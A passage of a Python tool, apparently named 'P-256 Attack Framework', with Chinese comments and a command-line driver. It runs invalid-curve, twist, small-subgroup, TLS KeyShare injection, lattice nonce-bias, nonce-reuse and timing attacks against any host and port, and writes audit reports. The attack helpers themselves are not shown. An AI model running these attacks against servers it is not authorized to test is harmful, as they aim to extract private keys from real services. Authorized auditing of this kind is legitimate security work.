        print(f"Target: {self.target_host}:{self.target_port}")
        print(f"{'='*60}\n")
        
        start_time = time.time()
        results = []
        
        # 1. 生成测试点
        print("[*] Generating test vectors...")
        test_points = self.probe_factory.generate_all_test_points()
        
        # 2. 测试非法曲线攻击
        print("\n[1/8] Testing Invalid Curve Attacks...")
        for point_type, point in test_points.items():
            if "invalid" in point_type or "twist" in point_type:
                result = await self._test_invalid_curve(point)
                if result.success:
                    print(f"    [!] VULNERABLE: {result.vulnerability}")
                results.append(result)
        
        # 3. 测试扭曲曲线攻击
        print("\n[2/8] Testing Twist Curve Attacks...")
        twist_point = self.probe_factory.generate_twist_curve_point()
        result = await self._test_twist_attack(twist_point)
        if result.success:
            print(f"    [!] CRITICAL: {result.vulnerability}")
        results.append(result)
        
        # 3b. 基于TLS的KeyShare注入（扭曲/非法点）
        print("\n[2b/8] Testing TLS KeyShare Injection (twist/invalid)...")
        tls_result = await self._test_tls_keyshare_injection()
        if tls_result and tls_result.success:
            print(f"    [!] TLS KeyShare accepted: {tls_result.vulnerability}")
        results.append(tls_result)
        
        # 4. 测试小子群攻击
        print("\n[3/8] Testing Small Subgroup Attacks...")
        for order in [2, 3, 5, 7]:
            small_point = self.probe_factory.generate_small_order_point(order)
            result = await self._test_small_subgroup(small_point)
            if result.success:
                print(f"    [!] CRITICAL: Order-{order} subgroup confinement!")
            results.append(result)
        
        # 5. 测试压缩点故障注入
        print("\n[4/8] Testing Compression Fault Injection...")
        normal_point = self.probe_factory.generate_valid_point()
        result = await self._test_compression_fault(normal_point)
        if result.success:
            print(f"    [!] TIMING LEAK: {result.vulnerability}")
        results.append(result)
        
        # 6. 测试格攻击（nonce偏差）
        print("\n[5/8] Testing Lattice Attack (Nonce Bias)...")
        signatures = await self._collect_ecdsa_signatures(100)
        if signatures:
            result = await self._test_lattice_attack(signatures)
            if result.success:
                print(f"    [!] NONCE BIAS: {result.vulnerability}")
            results.append(result)
        
        
        # 10. 测试自同态利用
        # 生成报告
        total_time = (time.time() - start_time) * 1000
        
        # 统计结果
        critical_vulns = [r for r in results if r.success and r.severity == "CRITICAL"]
        high_vulns = [r for r in results if r.success and r.severity == "HIGH"]
        medium_vulns = [r for r in results if r.success and r.severity == "MEDIUM"]
        
        report = P256AuditReport(
            target=f"{self.target_host}:{self.target_port}",
            timestamp=time.strftime("%Y-%m-%d %H:%M:%S"),
            total_tests=len(results),
            vulnerabilities_found=len([r for r in results if r.success]),
            critical_count=len(critical_vulns),
            high_count=len(high_vulns),
            medium_count=len(medium_vulns),
            attack_results=results,
            total_runtime_ms=total_time,
            overall_security_score=self._calculate_security_score(results),
        )
        
        # 打印摘要
        print(f"\n{'='*60}")
        print(f"AUDIT SUMMARY")
        print(f"{'='*60}")
        print(f"Total Tests: {report.total_tests}")
        print(f"Vulnerabilities Found: {report.vulnerabilities_found}")
        print(f"  - Critical: {report.critical_count}")
        print(f"  - High: {report.high_count}")
        print(f"  - Medium: {report.medium_count}")
        print(f"Security Score: {report.overall_security_score}/100")
        print(f"Runtime: {report.total_runtime_ms:.2f}ms")
        
        if critical_vulns:
            print(f"\n[!!!] CRITICAL VULNERABILITIES DETECTED:")
            for vuln in critical_vulns[:3]:
                print(f"  - {vuln.attack_type.value}: {vuln.vulnerability}")
        
        print(f"\n[*] Full report saved to: p256_audit_{int(time.time())}.json")
        self._save_report(report)
        
        return report
    
    async def _collect_ecdsa_signatures(self, count: int) -> List[Tuple[bytes, bytes, bytes]]:
        """收集ECDSA签名用于分析（仅真实来源：TLS 证书 + JWT ES 家族）。"""
        signatures: List[Tuple[bytes, bytes, bytes]] = []
        signatures.extend(await self._extract_tls_certificate_signatures())
        signatures.extend(await self._extract_jwt_ecdsa_signatures())
        return signatures[:count]
    
    def _calculate_security_score(self, results: List[AttackResult]) -> float:
        """计算安全评分"""
        score = 100.0
        
        for result in results:
            if result.success:
                if result.severity == "CRITICAL":
                    score -= 25
                elif result.severity == "HIGH":
                    score -= 15
                elif result.severity == "MEDIUM":
                    score -= 8
        
        return max(0, score)
    
    def _save_report(self, report: P256AuditReport):
        """保存审计报告"""
        filename = f"p256_audit_{int(time.time())}.json"
        
        # 转换为可序列化格式
        report_dict = {
            "target": report.target,
            "timestamp": report.timestamp,
            "summary": {
                "total_tests": report.total_tests,
                "vulnerabilities_found": report.vulnerabilities_found,
                "critical": report.critical_count,
                "high": report.high_count,
                "medium": report.medium_count,
                "security_score": report.overall_security_score
            },
            "vulnerabilities": [
                {
                    "type": r.attack_type.value,
                    "success": r.success,
                    "severity": r.severity,
                    "vulnerability": r.vulnerability,
                    "confidence": r.confidence,
                    "evidence": r.evidence
                } for r in report.attack_results if r.success
            ],
            "recommendations": report.recommendations,
            "runtime_ms": report.total_runtime_ms
        }
        
        with open(filename, 'w') as f:
            json.dump(report_dict, f, indent=2)
            
            #  命令行接口和主程序 

async def main():
    """主程序入口"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="P-256 Attack Framework - 'Arzamas-16' Enhanced Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # 基础扫描
  python p256_elliptic.py target.com 443
  
  # 完整审计
  python p256_elliptic.py target.com 443 --full-audit
  
  # 测试特定攻击
  python p256_elliptic.py target.com 443 --attack twist,subgroup,lattice,pohlig,nonce,fault
  
  # 收集签名进行格攻击和nonce分析
  python p256_elliptic.py target.com 443 --collect-signatures 1000
  
  # 深度时序分析
  python p256_elliptic.py target.com 443 --timing-analysis --samples 500
  
  # 导出详细报告
  python p256_elliptic.py target.com 443 --full-audit --output report.json --verbose
        """
    )
    
    parser.add_argument("host", help="Target host")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("--full-audit", action="store_true", help="Run comprehensive audit (all attacks)")
    parser.add_argument("--attack", help="Specific attacks to run (comma-separated)")
    parser.add_argument("--collect-signatures", type=int, help="Collect N signatures for analysis")
    parser.add_argument("--timing-analysis", action="store_true", help="Deep timing analysis mode")
    parser.add_argument("--samples", type=int, default=100, help="Number of samples for timing analysis")
    parser.add_argument("--output", help="Output file for detailed report")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads")
    parser.add_argument("--timeout", type=int, default=5, help="Socket timeout in seconds")
    
    args = parser.parse_args()
    
    print(f"P-256 椭圆曲线")
    print(f"考考你数学")
    
    # 运行P256实现验证
    if not any([args.full_audit, args.attack, args.collect_signatures, args.timing_analysis]):
        print("\n[*] 运行P256验证...")
        try:
            verify_p256_implementation()
            print("[+] P256实现验证完成!")
        except Exception as e:
            print(f"[!] P256实现验证失败: {e}")
        
        print("\n[*] 运行性能基准测试...")
        try:
            benchmark_p256_operations()
        except Exception as e:
            print(f"[!] 性能测试失败: {e}")
    
    # 初始化框架
    framework = P256AttackFramework(args.host, args.port)
    
    if args.full_audit:
        # 运行完整审计
        print(f"[*] Starting comprehensive P-256 audit on {args.host}:{args.port}")
        report = await framework.run_comprehensive_audit()
        
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(report.__dict__, f, indent=2, default=str)
            print(f"\n[+] Report saved to {args.output}")
    
    elif args.attack:
        # 运行特定攻击
        attacks = args.attack.split(',')
        print(f"[*] Running specific attacks: {attacks}")
        
        results = []
        for attack_name in attacks:
            attack_name = attack_name.strip().lower()
            
            if attack_name == "twist":
                print("\n[*] Testing Twist Curve Attack...")
                point = framework.probe_factory.generate_twist_curve_point()
                result = await framework._test_twist_attack(point)
                
            elif attack_name == "subgroup":
                print("\n[*] Testing Small Subgroup Attack...")
                point = framework.probe_factory.generate_small_order_point(3)
                result = await framework._test_small_subgroup(point)
                
            elif attack_name == "lattice":
                print("\n[*] Testing Lattice Attack...")
                print("    [*] Collecting signatures...")
                signatures = await framework._collect_ecdsa_signatures(args.samples)
                result = await framework._test_lattice_attack(signatures)
                
            elif attack_name == "compression":
                print("\n[*] Testing Compression Fault Injection...")
                point = framework.probe_factory.generate_valid_point()
                result = await framework._test_compression_fault(point)
                

            elif attack_name == "nonce":
                print("\n[*] Testing Nonce Reuse Attack...")
                signatures = await framework._collect_ecdsa_signatures(100)
                result = await framework._test_nonce_reuse_attack(signatures)
                
            else:
                print(f"    [!] Unknown attack: {attack_name}")
                continue
            
            results.append(result)
            
            if result.success:
                print(f"    [!] VULNERABLE: {result.vulnerability}")
                if args.verbose and result.evidence:
                    print(f"    [*] Evidence: {json.dumps(result.evidence, indent=4)}")
            else:
                print(f"    [+] Not vulnerable to {attack_name}")
        
        # 打印摘要
        vulnerable_count = sum(1 for r in results if r.success)
        print(f"\n[*] Attack Summary: {vulnerable_count}/{len(results)} attacks successful")
    
    elif args.collect_signatures:
        # 收集签名模式
        print(f"[*] Collecting {args.collect_signatures} ECDSA signatures for analysis...")
        
        signatures = await framework._collect_ecdsa_signatures(args.collect_signatures)
        
        if signatures:
            print(f"[+] Collected {len(signatures)} signatures")
            
            # 分析nonce健康度
            print("\n[*] Analyzing nonce health...")
            result = await framework._test_lattice_attack(signatures)
            
            if result.success:
                print(f"[!] NONCE VULNERABILITY DETECTED!")
                print(f"    Vulnerability: {result.vulnerability}")
                if result.evidence:
                    print(f"    MSB Bias: {result.evidence.get('msb_bias', 'N/A')}")
                    print(f"    LSB Entropy: {result.evidence.get('lsb_entropy', 'N/A')}")
                    print(f"    Leaked bits per signature: {result.evidence.get('estimated_leaked_bits', 'N/A')}")
            else:
                print("[+] Nonce generation appears healthy")
            
            if args.output:
                # 保存签名数据
                sig_data = {
                    "count": len(signatures),
                    "signatures": [
                        {
                            "r": sig[0].hex(),
                            "s": sig[1].hex(),
                            "hash": sig[2].hex()
                        } for sig in signatures
                    ],
                    "analysis": result.__dict__ if result else None
                }
                
                with open(args.output, 'w') as f:
                    json.dump(sig_data, f, indent=2)
                print(f"\n[+] Signature data saved to {args.output}")
    
    elif args.timing_analysis:
        # 深度时序分析
        print(f"[*] Running deep timing analysis with {args.samples} samples...")
        
        point = framework.probe_factory.generate_valid_point()
        
        # 收集各种操作的时序
        timing_data = {
            "scalar_mult": [],
            "point_validation": [],
            "compression": [],
            "decompression": [],
            "ecdh_exchange": []
        }
        
        print("\n[*] Collecting timing samples...")
        
        # 标量乘法时序
        for i in range(args.samples):
            scalar = random.randint(1, framework.p256.n - 1)
            timing = await framework._measure_scalar_mult_timing(point, scalar)
            timing_data["scalar_mult"].append(timing)
            
            if i % 20 == 0:
                print(f"    Progress: {i}/{args.samples}")
        
        # 分析时序
        print("\n[*] Timing Analysis Results:")
        print("=" * 50)
        
        for operation, timings in timing_data.items():
            if timings:
                mean_time = np.mean(timings)
                std_time = np.std(timings)
                min_time = min(timings)
                max_time = max(timings)
                
                print(f"\n{operation}:")
                print(f"  Mean: {mean_time/1000000:.3f} ms")
                print(f"  Std Dev: {std_time/1000000:.3f} ms")
                print(f"  Min: {min_time/1000000:.3f} ms")
                print(f"  Max: {max_time/1000000:.3f} ms")
                print(f"  Variance Ratio: {max_time/min_time:.2f}x")
                
                # 检测时序侧信道
                if std_time > mean_time * 0.1:  # 变异系数 > 10%
                    print(f"  [!] High variance detected - possible timing side-channel!")
        
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(timing_data, f, indent=2)
            print(f"\n[+] Timing data saved to {args.output}")
    
    else:
        # 默认：快速扫描
        print(f"[*] Running quick scan on {args.host}:{args.port}")
        
        # 测试最关键的几个攻击
        critical_tests = [
            ("Invalid Curve", framework.probe_factory.generate_invalid_curve_point()),
            ("Twist Curve", framework.probe_factory.generate_twist_curve_point()),
            ("Small Subgroup", framework.probe_factory.generate_small_order_point(2)),
        ]
        
        vulnerabilities = []
        
        for test_name, test_point in critical_tests:
            print(f"\n[*] Testing {test_name}...")
            
            if "Invalid" in test_name:
                result = await framework._test_invalid_curve(test_point)
            elif "Twist" in test_name:
                result = await framework._test_twist_attack(test_point)
            elif "Small" in test_name:
                result = await framework._test_small_subgroup(test_point)
            
            if result.success:
                print(f"    [!] VULNERABLE: {result.vulnerability}")
                vulnerabilities.append(result)
            else:
                print(f"    [+] Not vulnerable")
        
        # 快速摘要
        print("\n" + "=" * 60)
        print("QUICK SCAN SUMMARY")
        print("=" * 60)
        
        if vulnerabilities:
            print(f"[!] Found {len(vulnerabilities)} critical vulnerabilities!")
            for vuln in vulnerabilities:
                print(f"  - {vuln.attack_type.value}: {vuln.severity}")
            print("\n[!] Recommendation: Run full audit for complete assessment")
        else:
            print("[+] No critical vulnerabilities found in quick scan")
            print("[*] Consider running full audit for thorough testing")
    
    print("\n[*] Scan complete!")


#  程序入口点 
if __name__ == "__main__":
    # 设置异步运行
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()

